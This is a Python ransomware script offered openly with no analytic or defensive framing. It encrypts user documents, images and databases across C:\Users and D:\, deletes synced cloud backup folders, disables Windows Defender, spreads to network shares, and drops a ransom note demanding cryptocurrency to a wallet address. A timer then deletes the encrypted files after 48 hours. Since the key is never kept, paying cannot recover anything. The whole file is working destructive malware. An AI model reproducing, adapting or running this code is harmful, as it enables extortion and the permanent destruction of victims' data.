import os  
import shutil  
import socket  
import getpass  
import platform  
import subprocess  
from cryptography.fernet import Fernet  
from datetime import datetime, timedelta  
import threading  
import time  

# Encryption Key  
key = Fernet.generate_key()  
cipher = Fernet(key)  

# Ransom Note  
ransom_note = """  
?? **Your Files Have Been Encrypted!** ??  

To decrypt your files, you must pay $40 in USDT ERC20 to the following address:  
**0xAeb459716e2663F0CB92B6B491ce38C833FE747f**  

You have 48 hours to pay. After that, your files will be permanently deleted.  

Do not attempt to recover your files without paying. Any tampering will result in immediate destruction of your data.  
"""  

# File Extensions to Encrypt  
target_extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.mp4', '.mp3', '.zip', '.rar', '.db']  

# System Information  
system_info = f"""  
System Info:  
- User: {getpass.getuser()}  
- OS: {platform.system()} {platform.version()}  
- Hostname: {socket.gethostname()}  
"""  

# Functions  
def encrypt_file(file_path):  
    with open(file_path, 'rb') as f:  
        data = f.read()  
    encrypted_data = cipher.encrypt(data)  
    with open(file_path, 'wb') as f:  
        f.write(encrypted_data)  
    os.rename(file_path, file_path + '.locked')  

def encrypt_directory(directory):  
    for root, dirs, files in os.walk(directory):  
        for file in files:  
            if any(file.endswith(ext) for ext in target_extensions):  
                encrypt_file(os.path.join(root, file))  

def delete_backups():  
    backup_dirs = [  
        os.path.join(os.environ['USERPROFILE'], 'OneDrive'),  
        os.path.join(os.environ['USERPROFILE'], 'Google Drive'),  
        os.path.join(os.environ['USERPROFILE'], 'Dropbox'),  
    ]  
    for backup_dir in backup_dirs:  
        if os.path.exists(backup_dir):  
            shutil.rmtree(backup_dir, ignore_errors=True)  

def disable_antivirus():  
    if platform.system() == 'Windows':  
        subprocess.run(['sc', 'config', 'WinDefend', 'start=', 'disabled'], shell=True)  
        subprocess.run(['net', 'stop', 'WinDefend'], shell=True)  

def change_wallpaper():  
    if platform.system() == 'Windows':  
        import ctypes  
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "path_to_ransom_image.jpg", 0)  

def spread_lateral():  
    # Spread to network shares (example)  
    network_shares = ['\\\\192.168.1.10\\shared', '\\\\192.168.1.20\\files']  
    for share in network_shares:  
        if os.path.exists(share):  
            encrypt_directory(share)  

def countdown_timer():  
    deadline = datetime.now() + timedelta(hours=48)  
    while datetime.now() < deadline:  
        time.sleep(1)  
    # Destroy files if payment is not made  
    for root, dirs, files in os.walk('C:\\'):  
        for file in files:  
            if file.endswith('.locked'):  
                os.remove(os.path.join(root, file))  

# Main Execution  
if __name__ == '__main__':  
    # Encrypt Files  
    encrypt_directory('C:\\Users')  
    encrypt_directory('D:\\')  

    # Delete Backups  
    delete_backups()  

    # Disable Antivirus  
    disable_antivirus()  

    # Change Wallpaper  
    change_wallpaper()  

    # Spread Laterally  
    spread_lateral()  

    # Show Ransom Note  
    with open('C:\\Users\\Public\\Desktop\\RANSOM_NOTE.txt', 'w') as f:  
        f.write(ransom_note)  

    # Start Countdown Timer  
    timer_thread = threading.Thread(target=countdown_timer)  
    timer_thread.start()  